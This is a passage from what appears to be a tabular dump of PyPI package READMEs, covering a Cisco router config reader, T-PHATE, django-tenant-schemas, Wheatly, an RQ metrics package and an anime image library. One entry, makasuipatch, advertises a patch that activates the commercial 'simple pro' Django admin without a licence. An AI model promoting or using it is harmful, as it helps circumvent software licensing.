        ""network"": {
            ""subnet_address"": ""10.0.0.0"",
            ""mask"": {
                ""octets"": ""10.0.0.0"",
                ""cidr"": 24
            }
        },
        ""default_router"": ""10.0.0.1"",
        ""dns_server"": [
            ""8.8.8.8"",
            ...
        ],
        ""option"": [
            {
                ""code"": 2,
                ""string_type"": ""ascii"",
                ""string"": ""opt2""
            },
            ...
        ]
    },
    ...
]
```

# Get full configuration
```python
from getRoutersConfig import setInformations

router = setInformations(host_ip: str='', host_port: str='22', host_snmp_community: str='public', user: str='', password: str='', bastion_ip: str='', bastion_port: str='')

config = router.getFullConfiguration()
```

The Schema is :
```json

{
    ""system"": {},
    ""ipv4StaticRoutes"": [],
    ""interfaces"": [],
    ""dhcp"": []
}
```
","[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/netmiko.svg)](https://img.shields.io/pypi/pyversions/netmiko)

# What it does ?
This return Cisco configuration and information like :
 - Sytem informations
 - Static routes
 - Interfaces
 - DHCP

# Informations
bastion_ip and bastion_port are optional

# Get system informations
```python
from getRoutersConfig import setInformations

router = setInformations(host_ip: str='', host_port: str='22', host_snmp_community: str='public', user: str='', password: str='', bastion_ip: str='', bastion_port: str='')

system_information = router.getSystemInformation()
```

The Schema is :
```json
{
    ""serie"": ""C870"",
    ""version"": ""12.4(24)T4"",
    ""hostname"": ""HomeC871"",
    ""uptime"": {
        ""years"": 0,
        ""weeks"": 0,
        ""days"": 2,
        ""hours"": 2,
        ""minutes"": 44
}
```

# Get static routes
```python
from getRoutersConfig import setInformations

router = setInformations(host_ip: str='', host_port: str='22', host_snmp_community: str='public', user: str='', password: str='', bastion_ip: str='', bastion_port: str='')

static_routes = router.getStaticRoutes()
```

The Schema is :
```json
[
    {
        ""subnet_address"": ""1.1.1.1"",
        ""mask"": {
        ""octets"": ""255.255.255.255"",
        ""cidr"": 29
        },
        ""vrf"": ""TEST"",
        ""gateway"": ""2.2.2.2"",
        ""metric"": 250,
        ""tag"": 408,
        ""permanent"": ""false"",
        ""name"": ""the description"",
        ""track"": 20
    },
    ...
]
```

# Get interfaces
```python
from getRoutersConfig import setInformations

router = setInformations(host_ip: str='', host_port: str='22', host_snmp_community: str='public', user: str='', password: str='', bastion_ip: str='', bastion_port: str='')

interfaces = router.getInterfaces()
```

The Schema is :
```json

{
    ""switched"": [
        {
          ""name"": ""FastEthernet0"",
          ""switchport_mode"": ""access"",
          ""vlan"": ""1""
        },
        ...
    ],
    ""routed"": [
        {
          ""name"": ""FastEthernet4"",
          ""description"": """",
          ""ip"": ""192.168.1.101"",
          ""mask"": {
            ""octets"": ""255.255.255.0"",
            ""cidr"": 24
          },
          ""vrf"": """"
        },
        ...
    ]
},
```

# Get DHCP
```python
from getRoutersConfig import setInformations

router = setInformations(host_ip: str='', host_port: str='22', host_snmp_community: str='public', user: str='', password: str='', bastion_ip: str='', bastion_port: str='')

dhcp = router.getDhcp()
```

The Schema is :
```json

[
    {
        ""name"": ""DATA"",
        ""network"": {
            ""subnet_address"": ""10.0.0.0"",
            ""mask"": {
                ""octets"": ""10.0.0.0"",
                ""cidr"": 24
            }
        },
        ""default_router"": ""10.0.0.1"",
        ""dns_server"": [
            ""8.8.8.8"",
            ...
        ],
        ""option"": [
            {
                ""code"": 2,
                ""string_type"": ""ascii"",
                ""string"": ""opt2""
            },
            ...
        ]
    },
    ...
]
```

# Get full configuration
```python
from getRoutersConfig import setInformations

router = setInformations(host_ip: str='', host_port: str='22', host_snmp_community: str='public', user: str='', password: str='', bastion_ip: str='', bastion_port: str='')

config = router.getFullConfiguration()
```

The Schema is :
```json

{
    ""system"": {},
    ""ipv4StaticRoutes"": [],
    ""interfaces"": [],
    ""dhcp"": []
}
```
",danielricklin/getroutersconfig
tphate,https://github.com/KrishnaswamyLab/TPHATE/,0,1155,1155,"## Quick Start
If you would like to get started using T-PHATE, check out our [guided example](https://github.com/KrishnaswamyLab/TPHATE/blob/main/example/usage.ipynb).

If you have loaded a data matrix `data` in python (with samples on rows, features on columns, where you believe the samples are non-independent), you can run TPHATE as follows:

```
import tphate

tphate_op = tphate.TPHATE()
data_tphate = tphate_op.fit_transform(data)
```


## Temporal PHATE

Temporal PHATE (T-PHATE) is a python package for learning robust manifold representations of timeseries data with high temporal autocorrelation. TPHATE does so with a dual-kernel approach, estimating the first view as an affinity matrix based on PHATE manifold geometry, and the second view as summarizing the transitional probability between two timepoints based on the autocorrelation of the signal. For more information, see our [publication in Nature Computational Science](https://www.nature.com/articles/s43588-023-00419-0).

Busch, et al. **Multi-view manifold learning of human brain-state trajectories**. 2023. *Nature Computational Science.*


## Installation

`pip install tphate`
","## Quick Start
If you would like to get started using T-PHATE, check out our [guided example](https://github.com/KrishnaswamyLab/TPHATE/blob/main/example/usage.ipynb).

If you have loaded a data matrix `data` in python (with samples on rows, features on columns, where you believe the samples are non-independent), you can run TPHATE as follows:

```
import tphate

tphate_op = tphate.TPHATE()
data_tphate = tphate_op.fit_transform(data)
```


## Temporal PHATE

Temporal PHATE (T-PHATE) is a python package for learning robust manifold representations of timeseries data with high temporal autocorrelation. TPHATE does so with a dual-kernel approach, estimating the first view as an affinity matrix based on PHATE manifold geometry, and the second view as summarizing the transitional probability between two timepoints based on the autocorrelation of the signal. For more information, see our [publication in Nature Computational Science](https://www.nature.com/articles/s43588-023-00419-0).

Busch, et al. **Multi-view manifold learning of human brain-state trajectories**. 2023. *Nature Computational Science.*


## Installation

`pip install tphate`
",krishnaswamylab/tphate
makasuipatch,https://github.com/izhangxm/makasuipatch,1,663,663,"# makasuipatch
A patch to simple pro to make you activate it. Just used for learning.

## Install
```
pip install makasuipatch
```

## How to use
open `settings.py`
```
INSTALLED_APPS = [
    ""simplepro"",
    ""simpleui"",
    ""import_export"",
    ""makasuipatch"",
    ...
```

## issue
Tested compatible versions
```
- 6.x
```

## Package command
```
# build
python -m build

# upload to testpypi repo 
twine upload --repository testpypi dist/*

# install from testpypi repo 
pip install -i https://test.pypi.org/simple/ --no-deps makasuipatch

# upload to product repo
twine upload dist/*

# install from testpypi repo 
pip install makasuipatch --no-cache-dir
```
","# makasuipatch
A patch to simple pro to make you activate it. Just used for learning.

## Install
```
pip install makasuipatch
```

## How to use
open `settings.py`
```
INSTALLED_APPS = [
    ""simplepro"",
    ""simpleui"",
    ""import_export"",
    ""makasuipatch"",
    ...
```

## issue
Tested compatible versions
```
- 6.x
```

## Package command
```
# build
python -m build

# upload to testpypi repo 
twine upload --repository testpypi dist/*

# install from testpypi repo 
pip install -i https://test.pypi.org/simple/ --no-deps makasuipatch

# upload to product repo
twine upload dist/*

# install from testpypi repo 
pip install makasuipatch --no-cache-dir
```
",izhangxm/makasuipatch
django-tenants-schemas,https://github.com/adambirds/django-tenants-schemas,4,7611,7611,"django-tenant-schemas
=====================

|PyPi version| |PyPi downloads| |Python versions| |Travis CI| |PostgreSQL|

This application enables `django`_ powered websites to have multiple
tenants via `PostgreSQL schemas`_. A vital feature for every
Software-as-a-Service website.

Django provides currently no simple way to support multiple tenants
using the same project instance, even when only the data is different.
Because we don't want you running many copies of your project, you'll be
able to have:

-  Multiple customers running on the same instance
-  Shared and Tenant-Specific data
-  Tenant View-Routing

What are schemas
----------------

A schema can be seen as a directory in an operating system, each
directory (schema) with it's own set of files (tables and objects). This
allows the same table name and objects to be used in different schemas
without conflict. For an accurate description on schemas, see
`PostgreSQL's official documentation on schemas`_.

Why schemas
-----------

There are typically three solutions for solving the multitenancy
problem.

1. Isolated Approach: Separate Databases. Each tenant has it's own
   database.

2. Semi Isolated Approach: Shared Database, Separate Schemas. One
   database for all tenants, but one schema per tenant.

3. Shared Approach: Shared Database, Shared Schema. All tenants share
   the same database and schema. There is a main tenant-table, where all
   other tables have a foreign key pointing to.

This application implements the second approach, which in our opinion,
represents the ideal compromise between simplicity and performance.

-  Simplicity: barely make any changes to your current code to support
   multitenancy. Plus, you only manage one database.
-  Performance: make use of shared connections, buffers and memory.

Each solution has it's up and down sides, for a more in-depth
discussion, see Microsoft's excellent article on `Multi-Tenant Data
Architecture`_.

How it works
------------

Tenants are identified via their host name (i.e tenant.domain.com). This
information is stored on a table on the ``public`` schema. Whenever a
request is made, the host name is used to match a tenant in the
database. If there's a match, the search path is updated to use this
tenant's schema. So from now on all queries will take place at the
tenant's schema. For example, suppose you have a tenant ``customer`` at
http://customer.example.com. Any request incoming at
``customer.example.com`` will automatically use ``customer``\ 's schema
and make the tenant available at the request. If no tenant is found, a
404 error is raised. This also means you should have a tenant for your
main domain, typically using the ``public`` schema. For more information
please read the `setup`_ section.

What can this app do?
---------------------

As many tenants as you want
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Each tenant has its data on a specific schema. Use a single project
instance to serve as many as you want.

Tenant-specific and shared apps
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Tenant-specific apps do not share their data between tenants, but you
can also have shared apps where the information is always available and
shared between all.

Tenant View-Routing
~~~~~~~~~~~~~~~~~~~

You can have different views for ``http://customer.example.com/`` and
``http://example.com/``, even though Django only uses the string after
the host name to identify which view to serve.

Magic
~~~~~

Everyone loves magic! You'll be able to have all this barely having to
change your code!

Setup & Documentation
---------------------

**This is just a short setup guide**, it is **strongly** recommended
that you read the complete version at
`django-tenant-schemas.readthedocs.io`_.

Your ``DATABASE_ENGINE`` setting needs to be changed to

.. code-block:: python

    DATABASES = {
        'default': {
            'ENGINE': 'tenant_schemas.postgresql_backend',
            # ..
        }
    }

Add the middleware ``tenant_schemas.middleware.TenantMiddleware`` to the
top of ``MIDDLEWARE_CLASSES``, so that each request can be set to use
the correct schema.

.. code-block:: python

    MIDDLEWARE_CLASSES = (
        'tenant_schemas.middleware.TenantMiddleware',
        #...
    )

Add ``tenant_schemas.routers.TenantSyncRouter`` to your `DATABASE_ROUTERS`
setting, so that the correct apps can be synced, depending on what's
being synced (shared or tenant).

.. code-block:: python

    DATABASE_ROUTERS = (
        'tenant_schemas.routers.TenantSyncRouter',
    )

Add ``tenant_schemas`` to your ``INSTALLED_APPS``.

Create your tenant model
~~~~~~~~~~~~~~~~~~~~~~~~

.. code-block:: python

    from django.db import models
    from tenant_schemas.models import TenantMixin

    class Client(TenantMixin):
        name = models.CharField(max_length=100)
        paid_until =  models.DateField()
        on_trial = models.BooleanField()
        created_on = models.DateField(auto_now_add=True)

Define on ``settings.py`` which model is your tenant model. Assuming you
created ``Client`` inside an app named ``customers``, your
``TENANT_MODEL`` should look like this:

.. code-block:: python

    TENANT_MODEL = ""customers.Client"" # app.Model

Now run ``migrate_schemas`` to sync your apps to the ``public`` schema.

::

    python manage.py migrate_schemas --shared

Create your tenants just like a normal django model. Calling ``save``
will automatically create and sync/migrate the schema.

.. code-block:: python

    from customers.models import Client

    # create your public tenant
    tenant = Client(domain_url='tenant.my-domain.com',
                    schema_name='tenant1',
                    name='My First Tenant',
                    paid_until='2014-12-05',
                    on_trial=True)
    tenant.save()

Any request made to ``tenant.my-domain.com`` will now automatically set
your PostgreSQL's ``search_path`` to ``tenant1`` and ``public``, making
shared apps available too. This means that any call to the methods
``filter``, ``get``, ``save``, ``delete`` or any other function
involving a database connection will now be done at the tenant's schema,
so you shouldn't need to change anything at your views.

You're all set, but we have left key details outside of this short
tutorial, such as creating the public tenant and configuring shared and
tenant specific apps. Complete instructions can be found at
`django-tenant-schemas.readthedocs.io`_.



.. _django: https://www.djangoproject.com/
.. _PostgreSQL schemas: http://www.postgresql.org/docs/9.1/static/ddl-schemas.html
.. _PostgreSQL's official documentation on schemas: http://www.postgresql.org/docs/9.1/static/ddl-schemas.html
.. _Multi-Tenant Data Architecture: http://msdn.microsoft.com/en-us/library/aa479086.aspx

.. |PyPi version| image:: https://img.shields.io/pypi/v/django-tenant-schemas.svg
   :target: https://pypi.python.org/pypi/django-tenant-schemas
.. |PyPi downloads| image:: https://img.shields.io/pypi/dm/django-tenant-schemas.svg
   :target: https://pypi.python.org/pypi/django-tenant-schemas
.. |Python versions| image:: https://img.shields.io/pypi/pyversions/django-tenant-schemas.svg
.. |Travis CI| image:: https://travis-ci.org/bernardopires/django-tenant-schemas.svg?branch=master
   :target: https://travis-ci.org/bernardopires/django-tenant-schemas
.. |PostgreSQL| image:: https://img.shields.io/badge/PostgreSQL-9.2%2C%209.3%2C%209.4%2C%209.5%2C%209.6-blue.svg
.. _setup: https://django-tenant-schemas.readthedocs.io/en/latest/install.html
.. _django-tenant-schemas.readthedocs.io: https://django-tenant-schemas.readthedocs.io/en/latest/
","django-tenant-schemas
=====================

|PyPi version| |PyPi downloads| |Python versions| |Travis CI| |PostgreSQL|

This application enables `django`_ powered websites to have multiple
tenants via `PostgreSQL schemas`_. A vital feature for every
Software-as-a-Service website.

Django provides currently no simple way to support multiple tenants
using the same project instance, even when only the data is different.
Because we don't want you running many copies of your project, you'll be
able to have:

-  Multiple customers running on the same instance
-  Shared and Tenant-Specific data
-  Tenant View-Routing

What are schemas
----------------

A schema can be seen as a directory in an operating system, each
directory (schema) with it's own set of files (tables and objects). This
allows the same table name and objects to be used in different schemas
without conflict. For an accurate description on schemas, see
`PostgreSQL's official documentation on schemas`_.

Why schemas
-----------

There are typically three solutions for solving the multitenancy
problem.

1. Isolated Approach: Separate Databases. Each tenant has it's own
   database.

2. Semi Isolated Approach: Shared Database, Separate Schemas. One
   database for all tenants, but one schema per tenant.

3. Shared Approach: Shared Database, Shared Schema. All tenants share
   the same database and schema. There is a main tenant-table, where all
   other tables have a foreign key pointing to.

This application implements the second approach, which in our opinion,
represents the ideal compromise between simplicity and performance.

-  Simplicity: barely make any changes to your current code to support
   multitenancy. Plus, you only manage one database.
-  Performance: make use of shared connections, buffers and memory.

Each solution has it's up and down sides, for a more in-depth
discussion, see Microsoft's excellent article on `Multi-Tenant Data
Architecture`_.

How it works
------------

Tenants are identified via their host name (i.e tenant.domain.com). This
information is stored on a table on the ``public`` schema. Whenever a
request is made, the host name is used to match a tenant in the
database. If there's a match, the search path is updated to use this
tenant's schema. So from now on all queries will take place at the
tenant's schema. For example, suppose you have a tenant ``customer`` at
http://customer.example.com. Any request incoming at
``customer.example.com`` will automatically use ``customer``\ 's schema
and make the tenant available at the request. If no tenant is found, a
404 error is raised. This also means you should have a tenant for your
main domain, typically using the ``public`` schema. For more information
please read the `setup`_ section.

What can this app do?
---------------------

As many tenants as you want
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Each tenant has its data on a specific schema. Use a single project
instance to serve as many as you want.

Tenant-specific and shared apps
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Tenant-specific apps do not share their data between tenants, but you
can also have shared apps where the information is always available and
shared between all.

Tenant View-Routing
~~~~~~~~~~~~~~~~~~~

You can have different views for ``http://customer.example.com/`` and
``http://example.com/``, even though Django only uses the string after
the host name to identify which view to serve.

Magic
~~~~~

Everyone loves magic! You'll be able to have all this barely having to
change your code!

Setup & Documentation
---------------------

**This is just a short setup guide**, it is **strongly** recommended
that you read the complete version at
`django-tenant-schemas.readthedocs.io`_.

Your ``DATABASE_ENGINE`` setting needs to be changed to

.. code-block:: python

    DATABASES = {
        'default': {
            'ENGINE': 'tenant_schemas.postgresql_backend',
            # ..
        }
    }

Add the middleware ``tenant_schemas.middleware.TenantMiddleware`` to the
top of ``MIDDLEWARE_CLASSES``, so that each request can be set to use
the correct schema.

.. code-block:: python

    MIDDLEWARE_CLASSES = (
        'tenant_schemas.middleware.TenantMiddleware',
        #...
    )

Add ``tenant_schemas.routers.TenantSyncRouter`` to your `DATABASE_ROUTERS`
setting, so that the correct apps can be synced, depending on what's
being synced (shared or tenant).

.. code-block:: python

    DATABASE_ROUTERS = (
        'tenant_schemas.routers.TenantSyncRouter',
    )

Add ``tenant_schemas`` to your ``INSTALLED_APPS``.

Create your tenant model
~~~~~~~~~~~~~~~~~~~~~~~~

.. code-block:: python

    from django.db import models
    from tenant_schemas.models import TenantMixin

    class Client(TenantMixin):
        name = models.CharField(max_length=100)
        paid_until =  models.DateField()
        on_trial = models.BooleanField()
        created_on = models.DateField(auto_now_add=True)

Define on ``settings.py`` which model is your tenant model. Assuming you
created ``Client`` inside an app named ``customers``, your
``TENANT_MODEL`` should look like this:

.. code-block:: python

    TENANT_MODEL = ""customers.Client"" # app.Model

Now run ``migrate_schemas`` to sync your apps to the ``public`` schema.

::

    python manage.py migrate_schemas --shared

Create your tenants just like a normal django model. Calling ``save``
will automatically create and sync/migrate the schema.

.. code-block:: python

    from customers.models import Client

    # create your public tenant
    tenant = Client(domain_url='tenant.my-domain.com',
                    schema_name='tenant1',
                    name='My First Tenant',
                    paid_until='2014-12-05',
                    on_trial=True)
    tenant.save()

Any request made to ``tenant.my-domain.com`` will now automatically set
your PostgreSQL's ``search_path`` to ``tenant1`` and ``public``, making
shared apps available too. This means that any call to the methods
``filter``, ``get``, ``save``, ``delete`` or any other function
involving a database connection will now be done at the tenant's schema,
so you shouldn't need to change anything at your views.

You're all set, but we have left key details outside of this short
tutorial, such as creating the public tenant and configuring shared and
tenant specific apps. Complete instructions can be found at
`django-tenant-schemas.readthedocs.io`_.



.. _django: https://www.djangoproject.com/
.. _PostgreSQL schemas: http://www.postgresql.org/docs/9.1/static/ddl-schemas.html
.. _PostgreSQL's official documentation on schemas: http://www.postgresql.org/docs/9.1/static/ddl-schemas.html
.. _Multi-Tenant Data Architecture: http://msdn.microsoft.com/en-us/library/aa479086.aspx

.. |PyPi version| image:: https://img.shields.io/pypi/v/django-tenant-schemas.svg
   :target: https://pypi.python.org/pypi/django-tenant-schemas
.. |PyPi downloads| image:: https://img.shields.io/pypi/dm/django-tenant-schemas.svg
   :target: https://pypi.python.org/pypi/django-tenant-schemas
.. |Python versions| image:: https://img.shields.io/pypi/pyversions/django-tenant-schemas.svg
.. |Travis CI| image:: https://travis-ci.org/bernardopires/django-tenant-schemas.svg?branch=master
   :target: https://travis-ci.org/bernardopires/django-tenant-schemas
.. |PostgreSQL| image:: https://img.shields.io/badge/PostgreSQL-9.2%2C%209.3%2C%209.4%2C%209.5%2C%209.6-blue.svg
.. _setup: https://django-tenant-schemas.readthedocs.io/en/latest/install.html
.. _django-tenant-schemas.readthedocs.io: https://django-tenant-schemas.readthedocs.io/en/latest/
",adambirds/django-tenants-schemas
wheatly,https://github.com/jfcarter2358/wheatly,5,3272,3272,"# Wheatly
## About
Wheatly is an approach to developing integration tests in a more natural way. While some technical knowledge is still required, this framework aims to allow for tests to be written using more of a natural language approach while still allowing for the flexibility needed to create robust tests.

# Usage
Create some directory you want to store you plugins in (see the `plugins` directory for examples). The only required plugin is a `config.py` file which takes the following form:

```python
lexicon = {
    'model': {
        'class': ""Model"",
        'tokens': [
            'model',
            'models',
        ],
        'actions': {
            'get': [
                'get',
                'gets',
                'getting',
                'got'
            ],
            'delete': [
                'delete',
                'deleted',
                'deleting',
                'deletes'
            ]
        },
        'modifiers': {}
    }
}
```

Each object in the lexicon variable should correspond to a same name file within the same plugin directory. Each of these files will represent some sort of object you want to work with (or an object to encapsulate various actions). They should take this form (notice that the name of the class matches the lexicon's `class` field):

```python
import config
import wheatly.utils as utils

class Model:
    def __init__(self):
        self.name = 'model'
        self.tokens = config.lexicon[self.name]['tokens']
        self.actions = config.lexicon[self.name]['actions']
        self.modifiers = config.lexicon[self.name]['modifiers']

    def action_get(self, context, logger, args={}, modifiers=[]):
        # perform get actions for this object
        print('get!')
        # return modified context and success or fail
        return context, True

    def action_delete(self, context, logger, args={}, modifiers=[]):
        # perform delete actions for this object 
        print('delete!')
        # return modified context and success or fail
        return context, True

    def __str__(self):
        return f'{self.name}()'

    def __repr__(self):
        return f'{self.name}()'
```

After writing any modules you want to use, create a test file with the following form:

```yaml
tests:
  example:
    # Execute some HTTP request
    - curl:
        host: https://pypi.org
        path: project/calligraphy-scripting
        method: get
        # Set this to a dictionary if you want to send some JSON data alone with the request
        data: ~
        response_type: html
    # Execute a wait with the duration in seconds
    - wait: 5
    # Text of what to do
    - get a model:
        # Optional dictionary for any arguments you want to pass along
        foo: bar
```

Currently you can use `curl` and `wait` to run custom globally available actions. You can also write natural language actions which Wheatly will parse and run via the plugins you wrote.

To run your test, first generate the test JSON via:

```bash
python src/main.py generate -p ./plugins -i examples/example.yaml -o examples/example.json
```

You can then run the generated test JSON via:

```
python src/main.py run -p ./plugins -i examples/example.json
```

# TODO: 

- [ ] Add summary command
","# Wheatly
## About
Wheatly is an approach to developing integration tests in a more natural way. While some technical knowledge is still required, this framework aims to allow for tests to be written using more of a natural language approach while still allowing for the flexibility needed to create robust tests.

# Usage
Create some directory you want to store you plugins in (see the `plugins` directory for examples). The only required plugin is a `config.py` file which takes the following form:

```python
lexicon = {
    'model': {
        'class': ""Model"",
        'tokens': [
            'model',
            'models',
        ],
        'actions': {
            'get': [
                'get',
                'gets',
                'getting',
                'got'
            ],
            'delete': [
                'delete',
                'deleted',
                'deleting',
                'deletes'
            ]
        },
        'modifiers': {}
    }
}
```

Each object in the lexicon variable should correspond to a same name file within the same plugin directory. Each of these files will represent some sort of object you want to work with (or an object to encapsulate various actions). They should take this form (notice that the name of the class matches the lexicon's `class` field):

```python
import config
import wheatly.utils as utils

class Model:
    def __init__(self):
        self.name = 'model'
        self.tokens = config.lexicon[self.name]['tokens']
        self.actions = config.lexicon[self.name]['actions']
        self.modifiers = config.lexicon[self.name]['modifiers']

    def action_get(self, context, logger, args={}, modifiers=[]):
        # perform get actions for this object
        print('get!')
        # return modified context and success or fail
        return context, True

    def action_delete(self, context, logger, args={}, modifiers=[]):
        # perform delete actions for this object 
        print('delete!')
        # return modified context and success or fail
        return context, True

    def __str__(self):
        return f'{self.name}()'

    def __repr__(self):
        return f'{self.name}()'
```

After writing any modules you want to use, create a test file with the following form:

```yaml
tests:
  example:
    # Execute some HTTP request
    - curl:
        host: https://pypi.org
        path: project/calligraphy-scripting
        method: get
        # Set this to a dictionary if you want to send some JSON data alone with the request
        data: ~
        response_type: html
    # Execute a wait with the duration in seconds
    - wait: 5
    # Text of what to do
    - get a model:
        # Optional dictionary for any arguments you want to pass along
        foo: bar
```

Currently you can use `curl` and `wait` to run custom globally available actions. You can also write natural language actions which Wheatly will parse and run via the plugins you wrote.

To run your test, first generate the test JSON via:

```bash
python src/main.py generate -p ./plugins -i examples/example.yaml -o examples/example.json
```

You can then run the generated test JSON via:

```
python src/main.py run -p ./plugins -i examples/example.json
```

# TODO: 

- [ ] Add summary command
",jfcarter2358/wheatly
autoscale-queue-rq,https://github.com/autoscale-app/python-queue-rq,1,774,774,"# Python Queue RQ (Autoscale.app)

Produces [RQ] queue metrics for the [Autoscale.app] [Agent].

## Installation

Install the package:

    pip install autoscale-queue-rq

## Usage

Instructions are provided during the autoscaler setup process on [Autoscale.app].

## Development

Prepare environment:

    pip install poetry
    poetry install

Boot the shell:

    poetry shell

See Paver for relevant tasks:

    paver --help

## Release

1. Update `pyproject.toml` and `__init__.py`
2. Create and push a new tag (`v.1.2.3`)

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/autoscale-app/python-queue-rq

[Autoscale.app]: https://autoscale.app
[Agent]: https://github.com/autoscale-app/python-agent
[RQ]: https://python-rq.org

","# Python Queue RQ (Autoscale.app)

Produces [RQ] queue metrics for the [Autoscale.app] [Agent].

## Installation

Install the package:

    pip install autoscale-queue-rq

## Usage

Instructions are provided during the autoscaler setup process on [Autoscale.app].

## Development

Prepare environment:

    pip install poetry
    poetry install

Boot the shell:

    poetry shell

See Paver for relevant tasks:

    paver --help

## Release

1. Update `pyproject.toml` and `__init__.py`
2. Create and push a new tag (`v.1.2.3`)

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/autoscale-app/python-queue-rq

[Autoscale.app]: https://autoscale.app
[Agent]: https://github.com/autoscale-app/python-agent
[RQ]: https://python-rq.org

",autoscale-app/python-queue-rq
dghs-imgutils,https://github.com/deepghs/imgutils,38,10508,10508,"# imgutils

[![PyPI](https://img.shields.io/pypi/v/dghs-imgutils)](https://pypi.org/project/dghs-imgutils/)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/dghs-imgutils)
![Loc](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/narugo1992/8bfaa96eaa25cc9dac54debbf22d363d/raw/loc.json)
![Comments](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/narugo1992/8bfaa96eaa25cc9dac54debbf22d363d/raw/comments.json)

[![Code Test](https://github.com/deepghs/imgutils/workflows/Code%20Test/badge.svg)](https://github.com/deepghs/imgutils/actions?query=workflow%3A%22Code+Test%22)
[![Package Release](https://github.com/deepghs/imgutils/workflows/Package%20Release/badge.svg)](https://github.com/deepghs/imgutils/actions?query=workflow%3A%22Package+Release%22)
[![codecov](https://codecov.io/gh/deepghs/imgutils/branch/main/graph/badge.svg?token=XJVDP4EFAT)](https://codecov.io/gh/deepghs/imgutils)

![GitHub Org's stars](https://img.shields.io/github/stars/deepghs)
[![GitHub stars](https://img.shields.io/github/stars/deepghs/imgutils)](https://github.com/deepghs/imgutils/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/deepghs/imgutils)](https://github.com/deepghs/imgutils/network)
![GitHub commit activity](https://img.shields.io/github/commit-activity/m/deepghs/imgutils)
[![GitHub issues](https://img.shields.io/github/issues/deepghs/imgutils)](https://github.com/deepghs/imgutils/issues)
[![GitHub pulls](https://img.shields.io/github/issues-pr/deepghs/imgutils)](https://github.com/deepghs/imgutils/pulls)
[![Contributors](https://img.shields.io/github/contributors/deepghs/imgutils)](https://github.com/deepghs/imgutils/graphs/contributors)
[![GitHub license](https://img.shields.io/github/license/deepghs/imgutils)](https://github.com/deepghs/imgutils/blob/master/LICENSE)

A convenient and user-friendly anime-style image data processing library that integrates various advanced anime-style
image processing models.

## Installation

You can simply install it with `pip` command line from the official PyPI site.

```shell
pip install dghs-imgutils
```

If your operating environment includes a available GPU, you can use the following installation command to achieve higher
performance:

```shell
pip install dghs-imgutils[gpu]
```

For more information about installation, you can refer
to [Installation](https://deepghs.github.io/imgutils/main/tutorials/installation/index.html).

## Supported or Developing Features

### Tachie(差分) Detection and Clustering

For the dataset, we need to filter the differences between the tachie(差分). As shown in the following picture

![tachie](https://deepghs.github.io/imgutils/main/_images/lpips_full.dat.svg)

We can use `lpips_clustering` to cluster such situations as shown below

```python
from imgutils.metrics import lpips_clustering

images = [f'lpips/{i}.jpg' for i in range(1, 10)]
print(images)
# ['lpips/1.jpg', 'lpips/2.jpg', 'lpips/3.jpg', 'lpips/4.jpg', 'lpips/5.jpg', 'lpips/6.jpg', 'lpips/7.jpg', 'lpips/8.jpg', 'lpips/9.jpg']
print(lpips_clustering(images))  # -1 means noises, the same as that in sklearn
# [0, 0, 0, 1, 1, -1, -1, -1, -1]
```

### Monochrome Image Detection

When filtering the crawled images, we need to remove monochrome images. However, monochrome images are often not simply
composed of grayscale colors and may still contain colors, as shown by the first two rows of six images in the figure
below

![monochrome example](https://deepghs.github.io/imgutils/main/_images/monochrome.dat.svg)

We can use `is_monochrome` to determine whether an image is monochrome, as shown below:

```python
from imgutils.validate import is_monochrome

print(is_monochrome('mono/1.jpg'))  # monochrome images
# True
print(is_monochrome('mono/2.jpg'))
# True
print(is_monochrome('mono/3.jpg'))
# True
print(is_monochrome('mono/4.jpg'))
# True
print(is_monochrome('mono/5.jpg'))
# True
print(is_monochrome('mono/6.jpg'))
# True
print(is_monochrome('colored/7.jpg'))  # colored images
# False
print(is_monochrome('colored/8.jpg'))
# False
print(is_monochrome('colored/9.jpg'))
# False
print(is_monochrome('colored/10.jpg'))
# False
print(is_monochrome('colored/11.jpg'))
# False
print(is_monochrome('colored/12.jpg'))
# False
```

For more details, please refer to
the [official documentation](https://deepghs.github.io/imgutils/main/api_doc/validate/monochrome.html#module-imgutils.validate.monochrome)
.

### Truncated Image Check

The following code can be used to detect incomplete image files (such as images interrupted during the download
process):

```python
from imgutils.validate import is_truncated_file

if __name__ == '__main__':
    filename = 'test_jpg.jpg'
    if is_truncated_file(filename):
        print('This image is truncated, you\'d better '
              'remove this shit from your dataset.')
    else:
        print('This image is okay!')

```

### Image Tagging

The `imgutils` library integrates various anime-style image tagging models, allowing for results similar to the
following:

![tagging demo images](https://deepghs.github.io/imgutils/main/_images/tagging_demo.dat.svg)

The ratings, features, and characters in the image can be detected, like this:

```python
import os
from imgutils.tagging import get_wd14_tags

rating, features, chars = get_wd14_tags('skadi.jpg')
print(rating)
# {'general': 0.0011444687843322754, 'sensitive': 0.8876402974128723, 'questionable': 0.106781005859375, 'explicit': 0.000277101993560791}
print(features)
# {'1girl': 0.997527003288269, 'solo': 0.9797663688659668, 'long_hair': 0.9905703663825989, 'breasts': 0.9761719703674316,
#  'looking_at_viewer': 0.8981098532676697, 'bangs': 0.8810765743255615, 'large_breasts': 0.9498510360717773,
#  'shirt': 0.8377365469932556, 'red_eyes': 0.945058286190033, 'gloves': 0.9457170367240906, 'navel': 0.969594419002533,
#  'holding': 0.7881088852882385, 'hair_between_eyes': 0.7687551379203796, 'very_long_hair': 0.9301245212554932,
#  'standing': 0.6703325510025024, 'white_hair': 0.5292627811431885, 'short_sleeves': 0.8677047491073608,
#  'grey_hair': 0.5859264731407166, 'thighs': 0.9536856412887573, 'cowboy_shot': 0.8056888580322266,
#  'sweat': 0.8394746780395508, 'outdoors': 0.9473626613616943, 'parted_lips': 0.8986269235610962,
#  'sky': 0.9385137557983398, 'shorts': 0.8408567905426025, 'alternate_costume': 0.4245271384716034,
#  'day': 0.931140661239624, 'black_gloves': 0.8830795884132385, 'midriff': 0.7279844284057617,
#  'artist_name': 0.5333830714225769, 'cloud': 0.64717698097229, 'stomach': 0.9516432285308838,
#  'blue_sky': 0.9655293226242065, 'crop_top': 0.9485014081001282, 'black_shirt': 0.7366660833358765,
